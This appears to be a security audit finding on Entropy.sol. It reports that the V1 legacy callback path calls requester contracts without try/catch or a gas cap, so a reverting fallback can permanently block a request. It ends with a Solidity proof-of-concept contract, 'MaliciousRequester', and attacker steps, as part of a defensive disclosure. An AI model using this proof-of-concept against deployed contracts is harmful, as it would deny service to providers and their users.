### Title
Entropy `revealWithCallback` V1 Legacy Path Makes Unchecked External Call to Non-`IEntropyConsumer` Contracts via Fallback Dispatch — (`File: target_chains/ethereum/contracts/contracts/entropy/Entropy.sol`)

---

### Summary

The V1 legacy path inside `revealWithCallback` in `Entropy.sol` performs a bare external call to `req.requester` using only an `extcodesize` check. It does not verify that the target contract actually implements the `IEntropyConsumer` interface. If the requester is a contract with a fallback (or receive) function but no `_entropyCallback` selector, the EVM routes the call to the fallback, which executes with `msg.sender == Entropy contract`. Unlike the V2 path, this branch has no `try/catch`, no gas cap, and no `excessivelySafeCall` wrapper, so a reverting fallback propagates and permanently bricks the request.

---

### Finding Description

`revealWithCallback` branches on `req.gasLimit10k`:

- **V2 path** (`gasLimit10k != 0`): uses `excessivelySafeCall` with a gas cap and catches reverts gracefully.
- **V1 legacy path** (`gasLimit10k == 0`): triggered when the provider's `defaultGasLimit == 0`.

In the V1 path:

```solidity
// Entropy.sol lines 669–681
uint len;
assembly {
    len := extcodesize(callAddress)
}
uint256 startingGas = gasleft();
if (len != 0) {
    IEntropyConsumer(callAddress)._entropyCallback(
        sequenceNumber,
        provider,
        randomNumber
    );
}
```

The guard is only `extcodesize != 0`. If `callAddress` is a contract that does **not** implement `_entropyCallback` but has a `fallback()` or `receive()` function, the ABI-encoded call for selector `_entropyCallback` hits the fallback instead. The fallback runs with `msg.sender == address(Entropy)` and no gas limit. Because there is no `try/catch`, any revert in the fallback propagates and rolls back the entire `revealWithCallback` transaction — including the `clearRequest` that already ran — leaving the request permanently unfulfillable.

The `req.requester` field is set to `msg.sender` at request time:

```solidity
// Entropy.sol line 260
req.requester = msg.sender;
```

Any unprivileged user can call `requestWithCallback` from a contract they control, setting `req.requester` to that contract's address.

---

### Impact Explanation

1. **Unintended code execution on behalf of the Entropy contract**: The Entropy contract's address appears as `msg.sender` inside the fallback. Any contract that gates sensitive logic on `msg.sender == Entropy` (e.g., a consumer that trusts the Entropy address unconditionally without using the `IEntropyConsumer` guard) can have that gate bypassed.

2. **Permanent per-request DoS**: If the fallback always reverts, `revealWithCallback` always reverts for that sequence number. The request slot is never cleared, the provider's sequence number is consumed, and the keeper/provider can never fulfill the request. Repeated across many sequence numbers this degrades provider capacity.

3. **Unbounded gas consumption**: The fallback runs with no gas cap (unlike the V2 path). A gas-burning fallback can force callers of `revealWithCallback` to supply arbitrarily large gas, making fulfillment economically infeasible.

---

### Likelihood Explanation

- The V1 path is active for any provider whose `defaultGasLimit == 0`. Legacy providers that predate the V2 gas-limit feature retain this value.
- `requestWithCallback` is a public payable function callable by any user. Deploying a contract with a fallback and calling `requestWithCallback` from it requires no privilege.
- `revealWithCallback` is also public and callable by anyone, so the attacker can self-trigger the callback.
- No leaked keys, governance majority, or trusted-role access is required.

---

### Recommendation

Apply the same defensive pattern used in the V2 path to the V1 legacy path:

1. Wrap the V1 callback in a `try/catch` (or use `excessivelySafeCall`) so a reverting fallback does not propagate.
2. Optionally add an interface check (e.g., ERC-165 `supportsInterface`) before dispatching, or verify the return value of the call to confirm the selector was handled.
3. Consider enforcing a gas cap on the V1 path consistent with the provider's configured limit.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEntropyMinimal {
    function requestWithCallback(address provider, bytes32 userRandomNumber)
        external payable returns (uint64);
    function revealWithCallback(
        address provider, uint64 sequenceNumber,
        bytes32 userContribution, bytes32 providerContribution
    ) external;
}

// Requester contract: has a fallback but does NOT implement IEntropyConsumer
contract MaliciousRequester {
    IEntropyMinimal public entropy;
    uint64 public seqNum;

    constructor(address _entropy) { entropy = IEntropyMinimal(_entropy); }

    function makeRequest(address provider, bytes32 userRandom) external payable {
        seqNum = entropy.requestWithCallback{value: msg.value}(provider, userRandom);
    }

    // Fallback executes with msg.sender == Entropy contract
    // Scenario A: always reverts → revealWithCallback permanently reverts for this seqNum
    // Scenario B: executes arbitrary logic with msg.sender == Entropy
    fallback() external {
        // Scenario A: revert("DoS");
        // Scenario B: sensitiveTarget.doSomethingThatChecks(msg.sender == Entropy);
        revert("DoS");
    }
}

// Attacker steps:
// 1. Deploy MaliciousRequester pointing at Entropy (provider with defaultGasLimit == 0)
// 2. Call makeRequest{value: fee}(provider, userRandom)
// 3. Call entropy.revealWithCallback(provider, seqNum, userRandom, providerProof)
//    → Entropy calls MaliciousRequester._entropyCallback(...)
//    → No matching selector → fallback() fires with msg.sender == Entropy
//    → fallback reverts → revealWithCallback reverts
//    → Request is permanently stuck; provider sequence number consumed
```